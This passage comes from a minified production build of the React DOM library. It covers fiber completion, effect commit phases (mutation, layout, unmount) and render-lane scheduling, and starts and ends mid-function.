                typeof l.onClick == "function" && (e.onclick = Wl);
            }
            switch (n) {
              case "button":
              case "input":
              case "select":
              case "textarea":
                r = !!r.autoFocus;
                break e;
              case "img":
                r = !0;
                break e;
              default:
                r = !1;
            }
          }
          r && (t.flags |= 4);
        }
        t.ref !== null && ((t.flags |= 512), (t.flags |= 2097152));
      }
      return ge(t), null;
    case 6:
      if (e && t.stateNode != null) $d(e, t, e.memoizedProps, r);
      else {
        if (typeof r != "string" && t.stateNode === null) throw Error(E(166));
        if (((n = rn(Or.current)), rn(ct.current), pl(t))) {
          if (
            ((r = t.stateNode),
            (n = t.memoizedProps),
            (r[st] = t),
            (a = r.nodeValue !== n) && ((e = Fe), e !== null))
          )
            switch (e.tag) {
              case 3:
                fl(r.nodeValue, n, (e.mode & 1) !== 0);
                break;
              case 5:
                e.memoizedProps.suppressHydrationWarning !== !0 &&
                  fl(r.nodeValue, n, (e.mode & 1) !== 0);
            }
          a && (t.flags |= 4);
        } else
          (r = (n.nodeType === 9 ? n : n.ownerDocument).createTextNode(r)),
            (r[st] = t),
            (t.stateNode = r);
      }
      return ge(t), null;
    case 13:
      if (
        (Q(X),
        (r = t.memoizedState),
        e === null ||
          (e.memoizedState !== null && e.memoizedState.dehydrated !== null))
      ) {
        if (Y && _e !== null && t.mode & 1 && !(t.flags & 128))
          Yc(), Wn(), (t.flags |= 98560), (a = !1);
        else if (((a = pl(t)), r !== null && r.dehydrated !== null)) {
          if (e === null) {
            if (!a) throw Error(E(318));
            if (
              ((a = t.memoizedState),
              (a = a !== null ? a.dehydrated : null),
              !a)
            )
              throw Error(E(317));
            a[st] = t;
          } else
            Wn(), !(t.flags & 128) && (t.memoizedState = null), (t.flags |= 4);
          ge(t), (a = !1);
        } else qe !== null && (qo(qe), (qe = null)), (a = !0);
        if (!a) return t.flags & 65536 ? t : null;
      }
      return t.flags & 128
        ? ((t.lanes = n), t)
        : ((r = r !== null),
          r !== (e !== null && e.memoizedState !== null) &&
            r &&
            ((t.child.flags |= 8192),
            t.mode & 1 &&
              (e === null || X.current & 1 ? se === 0 && (se = 3) : Gi())),
          t.updateQueue !== null && (t.flags |= 4),
          ge(t),
          null);
    case 4:
      return (
        Bn(), Vo(e, t), e === null && Rr(t.stateNode.containerInfo), ge(t), null
      );
    case 10:
      return _i(t.type._context), ge(t), null;
    case 17:
      return Te(t.type) && Ul(), ge(t), null;
    case 19:
      if ((Q(X), (a = t.memoizedState), a === null)) return ge(t), null;
      if (((r = (t.flags & 128) !== 0), (o = a.rendering), o === null))
        if (r) or(a, !1);
        else {
          if (se !== 0 || (e !== null && e.flags & 128))
            for (e = t.child; e !== null; ) {
              if (((o = Gl(e)), o !== null)) {
                for (
                  t.flags |= 128,
                    or(a, !1),
                    r = o.updateQueue,
                    r !== null && ((t.updateQueue = r), (t.flags |= 4)),
                    t.subtreeFlags = 0,
                    r = n,
                    n = t.child;
                  n !== null;

                )
                  (a = n),
                    (e = r),
                    (a.flags &= 14680066),
                    (o = a.alternate),
                    o === null
                      ? ((a.childLanes = 0),
                        (a.lanes = e),
                        (a.child = null),
                        (a.subtreeFlags = 0),
                        (a.memoizedProps = null),
                        (a.memoizedState = null),
                        (a.updateQueue = null),
                        (a.dependencies = null),
                        (a.stateNode = null))
                      : ((a.childLanes = o.childLanes),
                        (a.lanes = o.lanes),
                        (a.child = o.child),
                        (a.subtreeFlags = 0),
                        (a.deletions = null),
                        (a.memoizedProps = o.memoizedProps),
                        (a.memoizedState = o.memoizedState),
                        (a.updateQueue = o.updateQueue),
                        (a.type = o.type),
                        (e = o.dependencies),
                        (a.dependencies =
                          e === null
                            ? null
                            : {
                                lanes: e.lanes,
                                firstContext: e.firstContext,
                              })),
                    (n = n.sibling);
                return B(X, (X.current & 1) | 2), t.child;
              }
              e = e.sibling;
            }
          a.tail !== null &&
            ne() > Vn &&
            ((t.flags |= 128), (r = !0), or(a, !1), (t.lanes = 4194304));
        }
      else {
        if (!r)
          if (((e = Gl(o)), e !== null)) {
            if (
              ((t.flags |= 128),
              (r = !0),
              (n = e.updateQueue),
              n !== null && ((t.updateQueue = n), (t.flags |= 4)),
              or(a, !0),
              a.tail === null && a.tailMode === "hidden" && !o.alternate && !Y)
            )
              return ge(t), null;
          } else
            2 * ne() - a.renderingStartTime > Vn &&
              n !== 1073741824 &&
              ((t.flags |= 128), (r = !0), or(a, !1), (t.lanes = 4194304));
        a.isBackwards
          ? ((o.sibling = t.child), (t.child = o))
          : ((n = a.last),
            n !== null ? (n.sibling = o) : (t.child = o),
            (a.last = o));
      }
      return a.tail !== null
        ? ((t = a.tail),
          (a.rendering = t),
          (a.tail = t.sibling),
          (a.renderingStartTime = ne()),
          (t.sibling = null),
          (n = X.current),
          B(X, r ? (n & 1) | 2 : n & 1),
          t)
        : (ge(t), null);
    case 22:
    case 23:
      return (
        Yi(),
        (r = t.memoizedState !== null),
        e !== null && (e.memoizedState !== null) !== r && (t.flags |= 8192),
        r && t.mode & 1
          ? $e & 1073741824 && (ge(t), t.subtreeFlags & 6 && (t.flags |= 8192))
          : ge(t),
        null
      );
    case 24:
      return null;
    case 25:
      return null;
  }
  throw Error(E(156, t.tag));
}
function Lm(e, t) {
  switch ((Ti(t), t.tag)) {
    case 1:
      return (
        Te(t.type) && Ul(),
        (e = t.flags),
        e & 65536 ? ((t.flags = (e & -65537) | 128), t) : null
      );
    case 3:
      return (
        Bn(),
        Q(Pe),
        Q(xe),
        Di(),
        (e = t.flags),
        e & 65536 && !(e & 128) ? ((t.flags = (e & -65537) | 128), t) : null
      );
    case 5:
      return Mi(t), null;
    case 13:
      if ((Q(X), (e = t.memoizedState), e !== null && e.dehydrated !== null)) {
        if (t.alternate === null) throw Error(E(340));
        Wn();
      }
      return (
        (e = t.flags), e & 65536 ? ((t.flags = (e & -65537) | 128), t) : null
      );
    case 19:
      return Q(X), null;
    case 4:
      return Bn(), null;
    case 10:
      return _i(t.type._context), null;
    case 22:
    case 23:
      return Yi(), null;
    case 24:
      return null;
    default:
      return null;
  }
}
var vl = !1,
  ye = !1,
  jm = typeof WeakSet == "function" ? WeakSet : Set,
  j = null;
function Ln(e, t) {
  var n = e.ref;
  if (n !== null)
    if (typeof n == "function")
      try {
        n(null);
      } catch (r) {
        ee(e, t, r);
      }
    else n.current = null;
}
function Qo(e, t, n) {
  try {
    n();
  } catch (r) {
    ee(e, t, r);
  }
}
var vu = !1;
function $m(e, t) {
  if (((Lo = Ol), (e = Ic()), Ci(e))) {
    if ("selectionStart" in e)
      var n = { start: e.selectionStart, end: e.selectionEnd };
    else
      e: {
        n = ((n = e.ownerDocument) && n.defaultView) || window;
        var r = n.getSelection && n.getSelection();
        if (r && r.rangeCount !== 0) {
          n = r.anchorNode;
          var l = r.anchorOffset,
            a = r.focusNode;
          r = r.focusOffset;
          try {
            n.nodeType, a.nodeType;
          } catch {
            n = null;
            break e;
          }
          var o = 0,
            i = -1,
            s = -1,
            u = 0,
            d = 0,
            v = e,
            g = null;
          t: for (;;) {
            for (
              var y;
              v !== n || (l !== 0 && v.nodeType !== 3) || (i = o + l),
                v !== a || (r !== 0 && v.nodeType !== 3) || (s = o + r),
                v.nodeType === 3 && (o += v.nodeValue.length),
                (y = v.firstChild) !== null;

            )
              (g = v), (v = y);
            for (;;) {
              if (v === e) break t;
              if (
                (g === n && ++u === l && (i = o),
                g === a && ++d === r && (s = o),
                (y = v.nextSibling) !== null)
              )
                break;
              (v = g), (g = v.parentNode);
            }
            v = y;
          }
          n = i === -1 || s === -1 ? null : { start: i, end: s };
        } else n = null;
      }
    n = n || { start: 0, end: 0 };
  } else n = null;
  for (jo = { focusedElem: e, selectionRange: n }, Ol = !1, j = t; j !== null; )
    if (((t = j), (e = t.child), (t.subtreeFlags & 1028) !== 0 && e !== null))
      (e.return = t), (j = e);
    else
      for (; j !== null; ) {
        t = j;
        try {
          var w = t.alternate;
          if (t.flags & 1024)
            switch (t.tag) {
              case 0:
              case 11:
              case 15:
                break;
              case 1:
                if (w !== null) {
                  var x = w.memoizedProps,
                    k = w.memoizedState,
                    m = t.stateNode,
                    c = m.getSnapshotBeforeUpdate(
                      t.elementType === t.type ? x : Ze(t.type, x),
                      k
                    );
                  m.__reactInternalSnapshotBeforeUpdate = c;
                }
                break;
              case 3:
                var h = t.stateNode.containerInfo;
                h.nodeType === 1
                  ? (h.textContent = "")
                  : h.nodeType === 9 &&
                    h.documentElement &&
                    h.removeChild(h.documentElement);
                break;
              case 5:
              case 6:
              case 4:
              case 17:
                break;
              default:
                throw Error(E(163));
            }
        } catch (b) {
          ee(t, t.return, b);
        }
        if (((e = t.sibling), e !== null)) {
          (e.return = t.return), (j = e);
          break;
        }
        j = t.return;
      }
  return (w = vu), (vu = !1), w;
}
function kr(e, t, n) {
  var r = t.updateQueue;
  if (((r = r !== null ? r.lastEffect : null), r !== null)) {
    var l = (r = r.next);
    do {
      if ((l.tag & e) === e) {
        var a = l.destroy;
        (l.destroy = void 0), a !== void 0 && Qo(t, n, a);
      }
      l = l.next;
    } while (l !== r);
  }
}
function ha(e, t) {
  if (
    ((t = t.updateQueue), (t = t !== null ? t.lastEffect : null), t !== null)
  ) {
    var n = (t = t.next);
    do {
      if ((n.tag & e) === e) {
        var r = n.create;
        n.destroy = r();
      }
      n = n.next;
    } while (n !== t);
  }
}
function Ko(e) {
  var t = e.ref;
  if (t !== null) {
    var n = e.stateNode;
    switch (e.tag) {
      case 5:
        e = n;
        break;
      default:
        e = n;
    }
    typeof t == "function" ? t(e) : (t.current = e);
  }
}
function _d(e) {
  var t = e.alternate;
  t !== null && ((e.alternate = null), _d(t)),
    (e.child = null),
    (e.deletions = null),
    (e.sibling = null),
    e.tag === 5 &&
      ((t = e.stateNode),
      t !== null &&
        (delete t[st], delete t[Mr], delete t[Fo], delete t[pm], delete t[mm])),
    (e.stateNode = null),
    (e.return = null),
    (e.dependencies = null),
    (e.memoizedProps = null),
    (e.memoizedState = null),
    (e.pendingProps = null),
    (e.stateNode = null),
    (e.updateQueue = null);
}
function Fd(e) {
  return e.tag === 5 || e.tag === 3 || e.tag === 4;
}
function gu(e) {
  e: for (;;) {
    for (; e.sibling === null; ) {
      if (e.return === null || Fd(e.return)) return null;
      e = e.return;
    }
    for (
      e.sibling.return = e.return, e = e.sibling;
      e.tag !== 5 && e.tag !== 6 && e.tag !== 18;

    ) {
      if (e.flags & 2 || e.child === null || e.tag === 4) continue e;
      (e.child.return = e), (e = e.child);
    }
    if (!(e.flags & 2)) return e.stateNode;
  }
}
function Yo(e, t, n) {
  var r = e.tag;
  if (r === 5 || r === 6)
    (e = e.stateNode),
      t
        ? n.nodeType === 8
          ? n.parentNode.insertBefore(e, t)
          : n.insertBefore(e, t)
        : (n.nodeType === 8
            ? ((t = n.parentNode), t.insertBefore(e, n))
            : ((t = n), t.appendChild(e)),
          (n = n._reactRootContainer),
          n != null || t.onclick !== null || (t.onclick = Wl));
  else if (r !== 4 && ((e = e.child), e !== null))
    for (Yo(e, t, n), e = e.sibling; e !== null; ) Yo(e, t, n), (e = e.sibling);
}
function Go(e, t, n) {
  var r = e.tag;
  if (r === 5 || r === 6)
    (e = e.stateNode), t ? n.insertBefore(e, t) : n.appendChild(e);
  else if (r !== 4 && ((e = e.child), e !== null))
    for (Go(e, t, n), e = e.sibling; e !== null; ) Go(e, t, n), (e = e.sibling);
}
var pe = null,
  Je = !1;
function Nt(e, t, n) {
  for (n = n.child; n !== null; ) Rd(e, t, n), (n = n.sibling);
}
function Rd(e, t, n) {
  if (ut && typeof ut.onCommitFiberUnmount == "function")
    try {
      ut.onCommitFiberUnmount(ia, n);
    } catch {}
  switch (n.tag) {
    case 5:
      ye || Ln(n, t);
    case 6:
      var r = pe,
        l = Je;
      (pe = null),
        Nt(e, t, n),
        (pe = r),
        (Je = l),
        pe !== null &&
          (Je
            ? ((e = pe),
              (n = n.stateNode),
              e.nodeType === 8 ? e.parentNode.removeChild(n) : e.removeChild(n))
            : pe.removeChild(n.stateNode));
      break;
    case 18:
      pe !== null &&
        (Je
          ? ((e = pe),
            (n = n.stateNode),
            e.nodeType === 8
              ? Ua(e.parentNode, n)
              : e.nodeType === 1 && Ua(e, n),
            $r(e))
          : Ua(pe, n.stateNode));
      break;
    case 4:
      (r = pe),
        (l = Je),
        (pe = n.stateNode.containerInfo),
        (Je = !0),
        Nt(e, t, n),
        (pe = r),
        (Je = l);
      break;
    case 0:
    case 11:
    case 14:
    case 15:
      if (
        !ye &&
        ((r = n.updateQueue), r !== null && ((r = r.lastEffect), r !== null))
      ) {
        l = r = r.next;
        do {
          var a = l,
            o = a.destroy;
          (a = a.tag),
            o !== void 0 && (a & 2 || a & 4) && Qo(n, t, o),
            (l = l.next);
        } while (l !== r);
      }
      Nt(e, t, n);
      break;
    case 1:
      if (
        !ye &&
        (Ln(n, t),
        (r = n.stateNode),
        typeof r.componentWillUnmount == "function")
      )
        try {
          (r.props = n.memoizedProps),
            (r.state = n.memoizedState),
            r.componentWillUnmount();
        } catch (i) {
          ee(n, t, i);
        }
      Nt(e, t, n);
      break;
    case 21:
      Nt(e, t, n);
      break;
    case 22:
      n.mode & 1
        ? ((ye = (r = ye) || n.memoizedState !== null), Nt(e, t, n), (ye = r))
        : Nt(e, t, n);
      break;
    default:
      Nt(e, t, n);
  }
}
function yu(e) {
  var t = e.updateQueue;
  if (t !== null) {
    e.updateQueue = null;
    var n = e.stateNode;
    n === null && (n = e.stateNode = new jm()),
      t.forEach(function (r) {
        var l = Am.bind(null, e, r);
        n.has(r) || (n.add(r), r.then(l, l));
      });
  }
}
function Xe(e, t) {
  var n = t.deletions;
  if (n !== null)
    for (var r = 0; r < n.length; r++) {
      var l = n[r];
      try {
        var a = e,
          o = t,
          i = o;
        e: for (; i !== null; ) {
          switch (i.tag) {
            case 5:
              (pe = i.stateNode), (Je = !1);
              break e;
            case 3:
              (pe = i.stateNode.containerInfo), (Je = !0);
              break e;
            case 4:
              (pe = i.stateNode.containerInfo), (Je = !0);
              break e;
          }
          i = i.return;
        }
        if (pe === null) throw Error(E(160));
        Rd(a, o, l), (pe = null), (Je = !1);
        var s = l.alternate;
        s !== null && (s.return = null), (l.return = null);
      } catch (u) {
        ee(l, t, u);
      }
    }
  if (t.subtreeFlags & 12854)
    for (t = t.child; t !== null; ) Id(t, e), (t = t.sibling);
}
function Id(e, t) {
  var n = e.alternate,
    r = e.flags;
  switch (e.tag) {
    case 0:
    case 11:
    case 14:
    case 15:
      if ((Xe(t, e), ot(e), r & 4)) {
        try {
          kr(3, e, e.return), ha(3, e);
        } catch (x) {
          ee(e, e.return, x);
        }
        try {
          kr(5, e, e.return);
        } catch (x) {
          ee(e, e.return, x);
        }
      }
      break;
    case 1:
      Xe(t, e), ot(e), r & 512 && n !== null && Ln(n, n.return);
      break;
    case 5:
      if (
        (Xe(t, e),
        ot(e),
        r & 512 && n !== null && Ln(n, n.return),
        e.flags & 32)
      ) {
        var l = e.stateNode;
        try {
          Pr(l, "");
        } catch (x) {
          ee(e, e.return, x);
        }
      }
      if (r & 4 && ((l = e.stateNode), l != null)) {
        var a = e.memoizedProps,
          o = n !== null ? n.memoizedProps : a,
          i = e.type,
          s = e.updateQueue;
        if (((e.updateQueue = null), s !== null))
          try {
            i === "input" && a.type === "radio" && a.name != null && nc(l, a),
              wo(i, o);
            var u = wo(i, a);
            for (o = 0; o < s.length; o += 2) {
              var d = s[o],
                v = s[o + 1];
              d === "style"
                ? ic(l, v)
                : d === "dangerouslySetInnerHTML"
                ? ac(l, v)
                : d === "children"
                ? Pr(l, v)
                : pi(l, d, v, u);
            }
            switch (i) {
              case "input":
                mo(l, a);
                break;
              case "textarea":
                rc(l, a);
                break;
              case "select":
                var g = l._wrapperState.wasMultiple;
                l._wrapperState.wasMultiple = !!a.multiple;
                var y = a.value;
                y != null
                  ? _n(l, !!a.multiple, y, !1)
                  : g !== !!a.multiple &&
                    (a.defaultValue != null
                      ? _n(l, !!a.multiple, a.defaultValue, !0)
                      : _n(l, !!a.multiple, a.multiple ? [] : "", !1));
            }
            l[Mr] = a;
          } catch (x) {
            ee(e, e.return, x);
          }
      }
      break;
    case 6:
      if ((Xe(t, e), ot(e), r & 4)) {
        if (e.stateNode === null) throw Error(E(162));
        (l = e.stateNode), (a = e.memoizedProps);
        try {
          l.nodeValue = a;
        } catch (x) {
          ee(e, e.return, x);
        }
      }
      break;
    case 3:
      if (
        (Xe(t, e), ot(e), r & 4 && n !== null && n.memoizedState.isDehydrated)
      )
        try {
          $r(t.containerInfo);
        } catch (x) {
          ee(e, e.return, x);
        }
      break;
    case 4:
      Xe(t, e), ot(e);
      break;
    case 13:
      Xe(t, e),
        ot(e),
        (l = e.child),
        l.flags & 8192 &&
          ((a = l.memoizedState !== null),
          (l.stateNode.isHidden = a),
          !a ||
            (l.alternate !== null && l.alternate.memoizedState !== null) ||
            (Qi = ne())),
        r & 4 && yu(e);
      break;
    case 22:
      if (
        ((d = n !== null && n.memoizedState !== null),
        e.mode & 1 ? ((ye = (u = ye) || d), Xe(t, e), (ye = u)) : Xe(t, e),
        ot(e),
        r & 8192)
      ) {
        if (
          ((u = e.memoizedState !== null),
          (e.stateNode.isHidden = u) && !d && e.mode & 1)
        )
          for (j = e, d = e.child; d !== null; ) {
            for (v = j = d; j !== null; ) {
              switch (((g = j), (y = g.child), g.tag)) {
                case 0:
                case 11:
                case 14:
                case 15:
                  kr(4, g, g.return);
                  break;
                case 1:
                  Ln(g, g.return);
                  var w = g.stateNode;
                  if (typeof w.componentWillUnmount == "function") {
                    (r = g), (n = g.return);
                    try {
                      (t = r),
                        (w.props = t.memoizedProps),
                        (w.state = t.memoizedState),
                        w.componentWillUnmount();
                    } catch (x) {
                      ee(r, n, x);
                    }
                  }
                  break;
                case 5:
                  Ln(g, g.return);
                  break;
                case 22:
                  if (g.memoizedState !== null) {
                    xu(v);
                    continue;
                  }
              }
              y !== null ? ((y.return = g), (j = y)) : xu(v);
            }
            d = d.sibling;
          }
        e: for (d = null, v = e; ; ) {
          if (v.tag === 5) {
            if (d === null) {
              d = v;
              try {
                (l = v.stateNode),
                  u
                    ? ((a = l.style),
                      typeof a.setProperty == "function"
                        ? a.setProperty("display", "none", "important")
                        : (a.display = "none"))
                    : ((i = v.stateNode),
                      (s = v.memoizedProps.style),
                      (o =
                        s != null && s.hasOwnProperty("display")
                          ? s.display
                          : null),
                      (i.style.display = oc("display", o)));
              } catch (x) {
                ee(e, e.return, x);
              }
            }
          } else if (v.tag === 6) {
            if (d === null)
              try {
                v.stateNode.nodeValue = u ? "" : v.memoizedProps;
              } catch (x) {
                ee(e, e.return, x);
              }
          } else if (
            ((v.tag !== 22 && v.tag !== 23) ||
              v.memoizedState === null ||
              v === e) &&
            v.child !== null
          ) {
            (v.child.return = v), (v = v.child);
            continue;
          }
          if (v === e) break e;
          for (; v.sibling === null; ) {
            if (v.return === null || v.return === e) break e;
            d === v && (d = null), (v = v.return);
          }
          d === v && (d = null), (v.sibling.return = v.return), (v = v.sibling);
        }
      }
      break;
    case 19:
      Xe(t, e), ot(e), r & 4 && yu(e);
      break;
    case 21:
      break;
    default:
      Xe(t, e), ot(e);
  }
}
function ot(e) {
  var t = e.flags;
  if (t & 2) {
    try {
      e: {
        for (var n = e.return; n !== null; ) {
          if (Fd(n)) {
            var r = n;
            break e;
          }
          n = n.return;
        }
        throw Error(E(160));
      }
      switch (r.tag) {
        case 5:
          var l = r.stateNode;
          r.flags & 32 && (Pr(l, ""), (r.flags &= -33));
          var a = gu(e);
          Go(e, a, l);
          break;
        case 3:
        case 4:
          var o = r.stateNode.containerInfo,
            i = gu(e);
          Yo(e, i, o);
          break;
        default:
          throw Error(E(161));
      }
    } catch (s) {
      ee(e, e.return, s);
    }
    e.flags &= -3;
  }
  t & 4096 && (e.flags &= -4097);
}
function _m(e, t, n) {
  (j = e), Md(e);
}
function Md(e, t, n) {
  for (var r = (e.mode & 1) !== 0; j !== null; ) {
    var l = j,
      a = l.child;
    if (l.tag === 22 && r) {
      var o = l.memoizedState !== null || vl;
      if (!o) {
        var i = l.alternate,
          s = (i !== null && i.memoizedState !== null) || ye;
        i = vl;
        var u = ye;
        if (((vl = o), (ye = s) && !u))
          for (j = l; j !== null; )
            (o = j),
              (s = o.child),
              o.tag === 22 && o.memoizedState !== null
                ? bu(l)
                : s !== null
                ? ((s.return = o), (j = s))
                : bu(l);
        for (; a !== null; ) (j = a), Md(a), (a = a.sibling);
        (j = l), (vl = i), (ye = u);
      }
      wu(e);
    } else
      l.subtreeFlags & 8772 && a !== null ? ((a.return = l), (j = a)) : wu(e);
  }
}
function wu(e) {
  for (; j !== null; ) {
    var t = j;
    if (t.flags & 8772) {
      var n = t.alternate;
      try {
        if (t.flags & 8772)
          switch (t.tag) {
            case 0:
            case 11:
            case 15:
              ye || ha(5, t);
              break;
            case 1:
              var r = t.stateNode;
              if (t.flags & 4 && !ye)
                if (n === null) r.componentDidMount();
                else {
                  var l =
                    t.elementType === t.type
                      ? n.memoizedProps
                      : Ze(t.type, n.memoizedProps);
                  r.componentDidUpdate(
                    l,
                    n.memoizedState,
                    r.__reactInternalSnapshotBeforeUpdate
                  );
                }
              var a = t.updateQueue;
              a !== null && nu(t, a, r);
              break;
            case 3:
              var o = t.updateQueue;
              if (o !== null) {
                if (((n = null), t.child !== null))
                  switch (t.child.tag) {
                    case 5:
                      n = t.child.stateNode;
                      break;
                    case 1:
                      n = t.child.stateNode;
                  }
                nu(t, o, n);
              }
              break;
            case 5:
              var i = t.stateNode;
              if (n === null && t.flags & 4) {
                n = i;
                var s = t.memoizedProps;
                switch (t.type) {
                  case "button":
                  case "input":
                  case "select":
                  case "textarea":
                    s.autoFocus && n.focus();
                    break;
                  case "img":
                    s.src && (n.src = s.src);
                }
              }
              break;
            case 6:
              break;
            case 4:
              break;
            case 12:
              break;
            case 13:
              if (t.memoizedState === null) {
                var u = t.alternate;
                if (u !== null) {
                  var d = u.memoizedState;
                  if (d !== null) {
                    var v = d.dehydrated;
                    v !== null && $r(v);
                  }
                }
              }
              break;
            case 19:
            case 17:
            case 21:
            case 22:
            case 23:
            case 25:
              break;
            default:
              throw Error(E(163));
          }
        ye || (t.flags & 512 && Ko(t));
      } catch (g) {
        ee(t, t.return, g);
      }
    }
    if (t === e) {
      j = null;
      break;
    }
    if (((n = t.sibling), n !== null)) {
      (n.return = t.return), (j = n);
      break;
    }
    j = t.return;
  }
}
function xu(e) {
  for (; j !== null; ) {
    var t = j;
    if (t === e) {
      j = null;
      break;
    }
    var n = t.sibling;
    if (n !== null) {
      (n.return = t.return), (j = n);
      break;
    }
    j = t.return;
  }
}
function bu(e) {
  for (; j !== null; ) {
    var t = j;
    try {
      switch (t.tag) {
        case 0:
        case 11:
        case 15:
          var n = t.return;
          try {
            ha(4, t);
          } catch (s) {
            ee(t, n, s);
          }
          break;
        case 1:
          var r = t.stateNode;
          if (typeof r.componentDidMount == "function") {
            var l = t.return;
            try {
              r.componentDidMount();
            } catch (s) {
              ee(t, l, s);
            }
          }
          var a = t.return;
          try {
            Ko(t);
          } catch (s) {
            ee(t, a, s);
          }
          break;
        case 5:
          var o = t.return;
          try {
            Ko(t);
          } catch (s) {
            ee(t, o, s);
          }
      }
    } catch (s) {
      ee(t, t.return, s);
    }
    if (t === e) {
      j = null;
      break;
    }
    var i = t.sibling;
    if (i !== null) {
      (i.return = t.return), (j = i);
      break;
    }
    j = t.return;
  }
}
var Fm = Math.ceil,
  Jl = Et.ReactCurrentDispatcher,
  Hi = Et.ReactCurrentOwner,
  Be = Et.ReactCurrentBatchConfig,
  O = 0,
  de = null,
  ae = null,
  me = 0,
  $e = 0,
  jn = Kt(0),
  se = 0,
  Ur = null,
  pn = 0,
  va = 0,
  Vi = 0,
  Sr = null,
  Ne = null,
  Qi = 0,
  Vn = 1 / 0,
  mt = null,
  ql = !1,
  Xo = null,
  At = null,
  gl = !1,
  Ft = null,
  ea = 0,
  Er = 0,
  Zo = null,
  jl = -1,
  $l = 0;
function ke() {
  return O & 6 ? ne() : jl !== -1 ? jl : (jl = ne());
}
function Wt(e) {
  return e.mode & 1
    ? O & 2 && me !== 0
      ? me & -me
      : vm.transition !== null
      ? ($l === 0 && ($l = wc()), $l)
      : ((e = z),
        e !== 0 || ((e = window.event), (e = e === void 0 ? 16 : Cc(e.type))),
        e)
    : 1;
}
function rt(e, t, n, r) {
  if (50 < Er) throw ((Er = 0), (Zo = null), Error(E(185)));
  Qr(e, n, r),
    (!(O & 2) || e !== de) &&
      (e === de && (!(O & 2) && (va |= n), se === 4 && jt(e, me)),
      Le(e, r),
      n === 1 && O === 0 && !(t.mode & 1) && ((Vn = ne() + 500), fa && Yt()));
}
function Le(e, t) {
  var n = e.callbackNode;
  vp(e, t);
  var r = Dl(e, e === de ? me : 0);
  if (r === 0)
    n !== null && js(n), (e.callbackNode = null), (e.callbackPriority = 0);
  else if (((t = r & -r), e.callbackPriority !== t)) {
    if ((n != null && js(n), t === 1))
      e.tag === 0 ? hm(ku.bind(null, e)) : Vc(ku.bind(null, e)),
        dm(function () {
          !(O & 6) && Yt();
        }),
        (n = null);
    else {
      switch (xc(r)) {
        case 1:
          n = yi;
          break;
        case 4:
          n = gc;
          break;
        case 16:
          n = Ml;
          break;
        case 536870912:
          n = yc;
          break;
        default:
          n = Ml;
      }
      n = Hd(n, Dd.bind(null, e));
    }
    (e.callbackPriority = t), (e.callbackNode = n);
  }
}
function Dd(e, t) {
  if (((jl = -1), ($l = 0), O & 6)) throw Error(E(327));
  var n = e.callbackNode;
  if (Dn() && e.callbackNode !== n) return null;
  var r = Dl(e, e === de ? me : 0);
  if (r === 0) return null;
  if (r & 30 || r & e.expiredLanes || t) t = ta(e, r);
  else {
    t = r;
    var l = O;
    O |= 2;
    var a = zd();
    (de !== e || me !== t) && ((mt = null), (Vn = ne() + 500), on(e, t));
    do
      try {
        Mm();
        break;
      } catch (i) {
        Od(e, i);
      }
    while (!0);
    $i(),
      (Jl.current = a),
      (O = l),
      ae !== null ? (t = 0) : ((de = null), (me = 0), (t = se));
  }
  if (t !== 0) {
    if (
      (t === 2 && ((l = Eo(e)), l !== 0 && ((r = l), (t = Jo(e, l)))), t === 1)
    )
      throw ((n = Ur), on(e, 0), jt(e, r), Le(e, ne()), n);
    if (t === 6) jt(e, r);
    else {
      if (
        ((l = e.current.alternate),
        !(r & 30) &&
          !Rm(l) &&
          ((t = ta(e, r)),
          t === 2 && ((a = Eo(e)), a !== 0 && ((r = a), (t = Jo(e, a)))),
          t === 1))
      )
        throw ((n = Ur), on(e, 0), jt(e, r), Le(e, ne()), n);
      switch (((e.finishedWork = l), (e.finishedLanes = r), t)) {
        case 0:
        case 1:
          throw Error(E(345));
        case 2:
          qt(e, Ne, mt);
          break;
        case 3:
          if (
            (jt(e, r), (r & 130023424) === r && ((t = Qi + 500 - ne()), 10 < t))
          ) {
            if (Dl(e, 0) !== 0) break;
            if (((l = e.suspendedLanes), (l & r) !== r)) {
              ke(), (e.pingedLanes |= e.suspendedLanes & l);
              break;
            }
            e.timeoutHandle = _o(qt.bind(null, e, Ne, mt), t);
            break;
          }
          qt(e, Ne, mt);
          break;
        case 4:
          if ((jt(e, r), (r & 4194240) === r)) break;
          for (t = e.eventTimes, l = -1; 0 < r; ) {
            var o = 31 - nt(r);
            (a = 1 << o), (o = t[o]), o > l && (l = o), (r &= ~a);
          }
          if (
            ((r = l),
            (r = ne() - r),
            (r =
              (120 > r
                ? 120
                : 480 > r
                ? 480
                : 1080 > r
                ? 1080
                : 1920 > r
                ? 1920
                : 3e3 > r
                ? 3e3
                : 4320 > r
                ? 4320
                : 1960 * Fm(r / 1960)) - r),
            10 < r)
          ) {
            e.timeoutHandle = _o(qt.bind(null, e, Ne, mt), r);
            break;
          }
          qt(e, Ne, mt);
          break;
        case 5:
          qt(e, Ne, mt);
          break;
        default:
          throw Error(E(329));
      }
    }
  }
  return Le(e, ne()), e.callbackNode === n ? Dd.bind(null, e) : null;
}
function Jo(e, t) {
  var n = Sr;
  return (
    e.current.memoizedState.isDehydrated && (on(e, t).flags |= 256),
    (e = ta(e, t)),
    e !== 2 && ((t = Ne), (Ne = n), t !== null && qo(t)),
    e
  );
}
function qo(e) {
  Ne === null ? (Ne = e) : Ne.push.apply(Ne, e);
}
function Rm(e) {
  for (var t = e; ; ) {
    if (t.flags & 16384) {
      var n = t.updateQueue;
      if (n !== null && ((n = n.stores), n !== null))
        for (var r = 0; r < n.length; r++) {
          var l = n[r],
            a = l.getSnapshot;
          l = l.value;
          try {
            if (!lt(a(), l)) return !1;
          } catch {
            return !1;
          }
        }
    }
    if (((n = t.child), t.subtreeFlags & 16384 && n !== null))
      (n.return = t), (t = n);
    else {
      if (t === e) break;
      for (; t.sibling === null; ) {
        if (t.return === null || t.return === e) return !0;
        t = t.return;
      }
      (t.sibling.return = t.return), (t = t.sibling);
    }
  }
  return !0;
}
function jt(e, t) {
  for (
    t &= ~Vi,
      t &= ~va,
      e.suspendedLanes |= t,
      e.pingedLanes &= ~t,
      e = e.expirationTimes;
    0 < t;

  ) {
    var n = 31 - nt(t),
      r = 1 << n;
    (e[n] = -1), (t &= ~r);
  }
}
function ku(e) {
  if (O & 6) throw Error(E(327));
  Dn();
  var t = Dl(e, 0);
  if (!(t & 1)) return Le(e, ne()), null;
  var n = ta(e, t);
  if (e.tag !== 0 && n === 2) {
    var r = Eo(e);
    r !== 0 && ((t = r), (n = Jo(e, r)));
  }
  if (n === 1) throw ((n = Ur), on(e, 0), jt(e, t), Le(e, ne()), n);
  if (n === 6) throw Error(E(345));
  return (
    (e.finishedWork = e.current.alternate),
    (e.finishedLanes = t),
    qt(e, Ne, mt),
    Le(e, ne()),
